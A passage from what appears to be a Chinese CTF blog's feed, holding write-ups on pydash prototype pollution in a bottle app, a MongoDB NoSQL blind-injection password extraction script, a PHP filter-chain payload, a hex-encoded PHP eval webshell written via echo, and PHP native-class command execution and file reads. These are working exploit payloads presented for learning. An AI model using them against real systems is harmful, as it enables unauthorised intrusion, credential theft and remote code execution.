class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">Hints: Flag在环境变量中</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from typing import Optional</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import pydash</span><br><span class="line">import bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[&#x27;__annotations__&#x27;, &#x27;__call__&#x27;, &#x27;__class__&#x27;, &#x27;__closure__&#x27;,</span><br><span class="line">               &#x27;__code__&#x27;, &#x27;__defaults__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;,</span><br><span class="line">               &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;,</span><br><span class="line">               &#x27;__ge__&#x27;, &#x27;__get__&#x27;, &#x27;__getattribute__&#x27;,</span><br><span class="line">               &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;,</span><br><span class="line">               &#x27;__kwdefaults__&#x27;, &#x27;__le__&#x27;, &#x27;__lt__&#x27;, &#x27;__module__&#x27;,</span><br><span class="line">               &#x27;__name__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__qualname__&#x27;,</span><br><span class="line">               &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;,</span><br><span class="line">               &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;__wrapped__&#x27;,</span><br><span class="line">               &quot;Optional&quot;,&quot;render&quot;</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    &quot;bottle&quot;</span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(dir(globals()[&quot;__builtins__&quot;]))</span><br><span class="line"></span><br><span class="line">def setval(name:str, path:str, value:str)-&gt; Optional[bool]:</span><br><span class="line">    if name.find(&quot;__&quot;)&gt;=0: return False</span><br><span class="line">    for word in __forbidden_name__:</span><br><span class="line">        if name==word:</span><br><span class="line">            return False</span><br><span class="line">    for word in __forbidden_path__:</span><br><span class="line">        if path.find(word)&gt;=0: return False</span><br><span class="line">    obj=globals()[name]</span><br><span class="line">    try:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    except:</span><br><span class="line">        return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@bottle.post(&#x27;/setValue&#x27;)</span><br><span class="line">def set_value():</span><br><span class="line">    name = bottle.request.query.get(&#x27;name&#x27;)</span><br><span class="line">    path=bottle.request.json.get(&#x27;path&#x27;) </span><br><span class="line">    if not isinstance(path,str):</span><br><span class="line">        return &quot;no&quot;</span><br><span class="line">    if len(name)&gt;6 or len(path)&gt;32:</span><br><span class="line">        return &quot;no&quot;</span><br><span class="line">    value=bottle.request.json.get(&#x27;value&#x27;)</span><br><span class="line">    return &quot;yes&quot; if setval(name, path, value) else &quot;no&quot;</span><br><span class="line"></span><br><span class="line">@bottle.get(&#x27;/render&#x27;)</span><br><span class="line">def render_template():</span><br><span class="line">    path=bottle.request.query.get(&#x27;path&#x27;)</span><br><span class="line">    if len(path)&gt;10:</span><br><span class="line">        return &quot;hacker&quot;</span><br><span class="line">    blacklist=[&quot;&#123;&quot;,&quot;&#125;&quot;,&quot;.&quot;,&quot;%&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;_&quot;] </span><br><span class="line">    for c in path:</span><br><span class="line">        if c in blacklist:</span><br><span class="line">            return &quot;hacker&quot;</span><br><span class="line">    return bottle.template(path)</span><br><span class="line">bottle.run(host=&#x27;0.0.0.0&#x27;, port=8000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此要想获得flag，就只能往<code>bottle.template</code>下手了，跟进bottle.template函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def template(*args, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Get a rendered template as a string iterator.</span><br><span class="line">    You can use a name, a filename or a template string as first parameter.</span><br><span class="line">    Template rendering arguments can be passed as dictionaries</span><br><span class="line">    or directly (as keyword arguments).</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    tpl = args[0] if args else None</span><br><span class="line">    for dictarg in args[1:]:</span><br><span class="line">        kwargs.update(dictarg)</span><br><span class="line">    adapter = kwargs.pop(&#x27;template_adapter&#x27;, SimpleTemplate)</span><br><span class="line">    lookup = kwargs.pop(&#x27;template_lookup&#x27;, TEMPLATE_PATH) #去到TEMPLATE_PATH去寻找</span><br><span class="line">    tplid = (id(lookup), tpl)</span><br><span class="line">    if tplid not in TEMPLATES or DEBUG:</span><br><span class="line">        settings = kwargs.pop(&#x27;template_settings&#x27;, &#123;&#125;)</span><br><span class="line">        if isinstance(tpl, adapter):</span><br><span class="line">            TEMPLATES[tplid] = tpl</span><br><span class="line">            if settings: TEMPLATES[tplid].prepare(**settings)</span><br><span class="line">        elif &quot;\n&quot; in tpl or &quot;&#123;&quot; in tpl or &quot;%&quot; in tpl or &#x27;$&#x27; in tpl:</span><br><span class="line">            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)</span><br><span class="line">        else:</span><br><span class="line">            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)</span><br><span class="line">    if not TEMPLATES[tplid]:</span><br><span class="line">        abort(500, &#x27;Template (%s) not found&#x27; % tpl)</span><br><span class="line">    return TEMPLATES[tplid].render(kwargs)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现如果<code>tpl</code>如果含有<code>\n、&#123;、%、$</code>的能够加入<code>TEMPLATES[tplid]</code>，后续能够直接渲染它，否则会将其作为模板的名字，尝试寻找对应的模板文件渲染，而<code>tpl</code>是我们传入的第一个参数</p><p>它会根据<code>TEMPLATE_PATH</code>里去找到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TEMPLATE_PATH = [&#x27;./&#x27;, &#x27;./views/&#x27;]</span><br><span class="line">TEMPLATES = &#123;&#125;</span><br><span class="line">DEBUG = False</span><br><span class="line">NORUN = False  # If set, run() does nothing. Used by load_app()</span><br></pre></td></tr></table></figure><p>接下来通过跟进lookup能够发现基类<code>BaseTemplate</code>中定义了搜索模板文件的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@classmethod</span><br><span class="line">    def search(cls, name, lookup=None):</span><br><span class="line">        &quot;&quot;&quot; Search name in all directories specified in lookup.</span><br><span class="line">        First without, then with common extensions. Return first hit. &quot;&quot;&quot;</span><br><span class="line">        if not lookup:</span><br><span class="line">            raise depr(0, 12, &quot;Empty template lookup path.&quot;, &quot;Configure a template lookup path.&quot;)</span><br><span class="line"></span><br><span class="line">        if os.path.isabs(name):</span><br><span class="line">            raise depr(0, 12, &quot;Use of absolute path for template name.&quot;,</span><br><span class="line">                       &quot;Refer to templates with names or paths relative to the lookup path.&quot;)</span><br><span class="line"></span><br><span class="line">        for spath in lookup:</span><br><span class="line">            spath = os.path.abspath(spath) + os.sep</span><br><span class="line">            fname = os.path.abspath(os.path.join(spath, name))</span><br><span class="line">            if not fname.startswith(spath): continue</span><br><span class="line">            if os.path.isfile(fname): return fname</span><br><span class="line">            for ext in cls.extensions:</span><br><span class="line">                if os.path.isfile(&#x27;%s.%s&#x27; % (fname, ext)):</span><br><span class="line">                    return &#x27;%s.%s&#x27; % (fname, ext)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>它会去搜索TEMPLATE_PATH下的文件(应该)，理论上只需要污染TEMPLATE_PATH就能够做到任意文件读</p><p>但是上文说过pydash的版本是8.0.5，因此不能够直接通过__globals__去获得bottle，在pydash 5.1.2版本中能够使用__globals__，但是高版本下已经被修复了，现在会报access to restricted key <strong>globals</strong></p><p>因此我们要想办法绕过restricted key</p><p>可以发现该异常只有输入在RESTRICTED_KEYS中的内容时才会触发：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#pydash.helpper</span><br><span class="line">def _raise_if_restricted_key(key):</span><br><span class="line">    if key in RESTRICTED_KEYS:</span><br><span class="line">        raise KeyError(f&quot;access to restricted key &#123;key!r&#125; is not allowed&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而<code>RESTRICTED_KEYS</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESTRICTED_KEYS = (&quot;__globals__&quot;, &quot;__builtins__&quot;)</span><br></pre></td></tr></table></figure><p>理论上可以通过pydash自己污染掉<code>RESTRICTED_KEYS</code>从而使用globals：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=pydasy</span><br><span class="line">&#123;</span><br><span class="line">    &quot;path&quot;:&quot;helpers.RESTRICTED_KEYS&quot;,</span><br><span class="line">    &quot;value&quot;:[]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>污染成功后再污染<code>TEMPLATE_PATH</code>即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=setval</span><br><span class="line">&#123;</span><br><span class="line">    &quot;path&quot;:&quot;__globals__.bottle.TEMPLATE_PATH&quot;,</span><br><span class="line">    &quot;value&quot;:[</span><br><span class="line">        &quot;/&quot;,</span><br><span class="line">        &quot;./&quot;,</span><br><span class="line">        &quot;/proc/self&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后再渲染envrion即可：?name&#x3D;environ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;圣钥之战1-0&quot;&gt;&lt;a href=&quot;#圣钥之战1-0&quot; class=&quot;headerlink&quot; title=&quot;圣钥之战1.0&quot;&gt;&lt;/a&gt;圣钥之战1.0&lt;/h2&gt;&lt;p&gt;访问read路由拿到源码&lt;/p&gt;
&lt;figure class=&quot;highlight plaintex</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>nosql布尔盲注</title>
    <link href="http://1768161086.github,io/2025/03/17/nosql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <id>http://1768161086.github,io/2025/03/17/nosql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
    <published>2025-03-17T13:34:46.000Z</published>
    <updated>2025-03-17T13:38:55.704Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2024-hz-ezjava"><a href="#CISCN2024-hz-ezjava" class="headerlink" title="CISCN2024_hz_ezjava"></a>CISCN2024_hz_ezjava</h2><p>1.登录是&#x2F;login接口发起一个POST请求。</p><p>2.从源码可以看出来，在第一次访问&#x2F;login接口时会初始化一个<code>username为admin，password为随机32位字符</code>的数据进入数据库，这块采用单例模式，确保数据仅初始化一次。</p><p>3.点击登录后，会拿我们传入的数据去数据库查询信息</p><ul><li>若查询不到，则返回<code>username or password incorrect</code></li><li>若查到信息后，提取出<code>password</code>字段与我们输入的进行比对<ul><li>若匹配失败返回<code>password incorrect</code></li><li>若匹配成功，則读取flag</li></ul></li></ul><p>4.该项目使用的是<code>mongodb</code>数据库，并且存在明显的拼接点</p><p>5.nosql注入，我们拿一个联合注入的poc试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;: &#x27;a&amp;password=&#x27; &#125;], $comment: &#x27;123456</span><br></pre></td></tr></table></figure><p>6.调试发现可以成功查询到信息，但由于和我们传入的password值不匹配所以返回信息<code>password incorrect</code></p><p>编写nosql布尔盲注的脚本跑出密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:9999/login&quot;</span><br><span class="line">mylist = &quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span><br><span class="line">password = &quot;&quot;</span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for j in mylist:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;&#x27;,&#x27;password&#x27;:&#123;&#x27;$regex&#x27;:&#x27;^&quot;+password+j+&quot;.*&#x27;&#125;,&#x27;username&#x27;:&#x27;admin&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        #&#x27;,&#x27;password&#x27;:&#123;&#x27;$regex&#x27;:&#x27;^x.*&#x27;&#125;,&#x27;username&#x27;:&#x27;admin</span><br><span class="line">        r = requests.post(url,data=data,proxies=proxies)</span><br><span class="line">        if r.text.find(&quot;username or password incorrect&quot;)==-1:</span><br><span class="line">            password+=j</span><br><span class="line">            print(password)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN2024-hz-ezjava&quot;&gt;&lt;a href=&quot;#CISCN2024-hz-ezjava&quot; class=&quot;headerlink&quot; title=&quot;CISCN2024_hz_ezjava&quot;&gt;&lt;/a&gt;CISCN2024_hz_ezjava&lt;/h2&gt;&lt;p&gt;1.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php_filter_chain</title>
    <link href="http://1768161086.github,io/2025/03/16/php-filter-chain/"/>
    <id>http://1768161086.github,io/2025/03/16/php-filter-chain/</id>
    <published>2025-03-16T10:28:16.000Z</published>
    <updated>2025-03-16T10:32:15.727Z</updated>
    
    <content type="html"><![CDATA[<h2 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h2><p>1.先随便尝试包含下index.php</p><p>2.访问.&#x2F;what’s_this.php</p><p>一眼顶针，鉴定为php_filter_chain</p><p>直接打的话XYCTF后会有脏数据</p><p>3.构造XYCTF&lt;?php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python php_filter_chain_generator.py --chain &quot;XYCTF&lt;?php&quot;</span><br></pre></td></tr></table></figure><p>最终payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags</span><br></pre></td></tr></table></figure><p>类似于：XYCTF_ezLFI</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;连连看到底是连连什么看&quot;&gt;&lt;a href=&quot;#连连看到底是连连什么看&quot; class=&quot;headerlink&quot; title=&quot;连连看到底是连连什么看&quot;&gt;&lt;/a&gt;连连看到底是连连什么看&lt;/h2&gt;&lt;p&gt;1.先随便尝试包含下index.php&lt;/p&gt;
&lt;p&gt;2.访问.&amp;#</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Bash内建命令</title>
    <link href="http://1768161086.github,io/2025/03/15/Bash%E5%86%85%E5%BB%BA%E5%91%BD%E4%BB%A4/"/>
    <id>http://1768161086.github,io/2025/03/15/Bash%E5%86%85%E5%BB%BA%E5%91%BD%E4%BB%A4/</id>
    <published>2025-03-15T05:57:55.000Z</published>
    <updated>2025-03-15T06:07:03.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Bash-内建命令"><a href="#Bash-内建命令" class="headerlink" title="Bash 内建命令"></a>Bash 内建命令</h1><p>这些命令是由Bash自身提供，而不是独立的程序：</p><p>alias - 定义或显示别名。<br>cd - 改变当前目录。<br>echo - 输出参数到标准输出。<br>exit - 退出当前shell。<br>export - 设置或显示环境变量。<br>history - 显示命令历史记录。<br>pwd - 打印当前工作目录的路径。<br>read - 从标准输入读取一行数据。<br>set - 设置或取消设置shell选项和位置参数。<br>type - 显示一个命令的类型。<br>unset - 删除变量或函数的定义。</p><h2 id="XYCTF2024ezMake"><a href="#XYCTF2024ezMake" class="headerlink" title="XYCTF2024ezMake"></a>XYCTF2024ezMake</h2><p>1.echo可以执行</p><p>2.直接echo写马会有waf</p><p>3.hex2bin可以过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?=eval(hex2bin(&quot;6576616c28245f504f53545b22636d64225d293b&quot;))?&gt;&#x27; &gt; yjh.php</span><br></pre></td></tr></table></figure><p>或者直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $$(&lt; flag)</span><br></pre></td></tr></table></figure><h2 id="XYCTF2024ez-Make"><a href="#XYCTF2024ez-Make" class="headerlink" title="XYCTF2024ez?Make"></a>XYCTF2024ez?Make</h2><p>1.这题patch了一下上题的非预期，不能再echo写马了</p><p>但也把&#x2F;bin下的命令放了出来，不再有PATH的限制</p><p>2.既然可以pwd，那就试试能不能cd。</p><p>知道flag路径在&#x2F;flag，所以可以cd再进行读文件，读文件的方法ban了不少，经过测试more还能用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;more [d-h][k-m][9-z][e-h]</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Bash-内建命令&quot;&gt;&lt;a href=&quot;#Bash-内建命令&quot; class=&quot;headerlink&quot; title=&quot;Bash 内建命令&quot;&gt;&lt;/a&gt;Bash 内建命令&lt;/h1&gt;&lt;p&gt;这些命令是由Bash自身提供，而不是独立的程序：&lt;/p&gt;
&lt;p&gt;alias - 定义</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php原生类</title>
    <link href="http://1768161086.github,io/2025/03/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <id>http://1768161086.github,io/2025/03/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</id>
    <published>2025-03-15T04:59:25.000Z</published>
    <updated>2025-04-18T00:51:21.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP原生类的利用"><a href="#PHP原生类的利用" class="headerlink" title="PHP原生类的利用"></a>PHP原生类的利用</h1><h2 id="PHP内置类的遍历"><a href="#PHP内置类的遍历" class="headerlink" title="PHP内置类的遍历"></a>PHP内置类的遍历</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line">foreach ($classes as $class) &#123;</span><br><span class="line">    $methods = get_class_methods($class);</span><br><span class="line">    foreach ($methods as $method) &#123;</span><br><span class="line">        if (in_array($method, array(</span><br><span class="line">            &#x27;__destruct&#x27;,</span><br><span class="line">            &#x27;__toString&#x27;,</span><br><span class="line">            &#x27;__wakeup&#x27;,</span><br><span class="line">            &#x27;__call&#x27;,</span><br><span class="line">            &#x27;__callStatic&#x27;,</span><br><span class="line">            &#x27;__get&#x27;,</span><br><span class="line">            &#x27;__set&#x27;,</span><br><span class="line">            &#x27;__isset&#x27;,</span><br><span class="line">            &#x27;__unset&#x27;,</span><br><span class="line">            &#x27;__invoke&#x27;,</span><br><span class="line">            &#x27;__set_state&#x27;    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            print $class . &#x27;::&#x27; . $method . &quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/blog_migrate/013093f404380a670c210bd0f2387648.png" alt="在这里插入图片描述"></p><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>在CTF题目中，好几次都遇到了利用 PHP 原生类进行XSS、反序列化、SSRF以及XXE的思路，一直想好好看一下 PHP 原生类在 CTF 中的利用，迫于生活xx拖了好久。今天终于有机会好好总结总结了。常遇到的几个 PHP 原生类有如下几个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Error是php的一个内置类，用于自动自定义一个Error</span><br><span class="line"></span><br><span class="line">Exception是所有异常的基类.在php7环境下可能有xss漏洞，它内置有一个 __toString() 的方法，常用于PHP 反序列化中。</span><br><span class="line"></span><br><span class="line">SoapClient专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</span><br><span class="line"></span><br><span class="line">DirectoryIterator提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</span><br><span class="line"></span><br><span class="line">FilesystemIterator用于迭代文件系统目录，支持过滤器和递归。</span><br><span class="line"></span><br><span class="line">SplFileObject可以构造一个新的文件对象用于后续的读取。</span><br><span class="line"></span><br><span class="line">SimpleXMLElement这个内置类用于解析 XML 文档中的元素。</span><br></pre></td></tr></table></figure><h2 id="2-Error-Exception类方法："><a href="#2-Error-Exception类方法：" class="headerlink" title="2.Error&#x2F;Exception类方法："></a>2.<strong>Error&#x2F;Exception类方法：</strong></h2><p>Error::__construct — 初始化 error 对象<br>Error::getMessage — 获取错误信息<br>Error::getPrevious — 返回先前的 Throwable<br>Error::getCode — 获取错误代码<br>Error::getFile — 获取错误发生时的文件<br>Error::getLine — 获取错误发生时的行号<br>Error::getTrace — 获取调用栈（stack trace）<br>Error::getTraceAsString — 获取字符串形式的调用栈（stack trace）<br>Error::__toString — error 的字符串表达<br>Error::__clone — 克隆 error<br>3.XYCTFezClass</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$aa=$_GET[&#x27;aa&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">$bb=$_GET[&#x27;bb&#x27;];</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">((new $a($aa))-&gt;$c())((new $b($bb))-&gt;$c());</span><br></pre></td></tr></table></figure><p>现在通过Error我们可以构造任意字符串，这不为所欲为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=new Error(&quot;Z3r4y&quot;);</span><br><span class="line">echo $a-&gt;getMessage();</span><br><span class="line">//Z3r4y</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=Error&amp;aa=system&amp;b=Error&amp;bb=cat /f*&amp;c=getMessage</span><br></pre></td></tr></table></figure><h2 id="4-XYCTFserialize"><a href="#4-XYCTFserialize" class="headerlink" title="4.XYCTFserialize"></a>4.XYCTFserialize</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new $_POST[&#x27;X&#x27;]($_POST[&#x27;Y&#x27;]);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=./flag.php</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
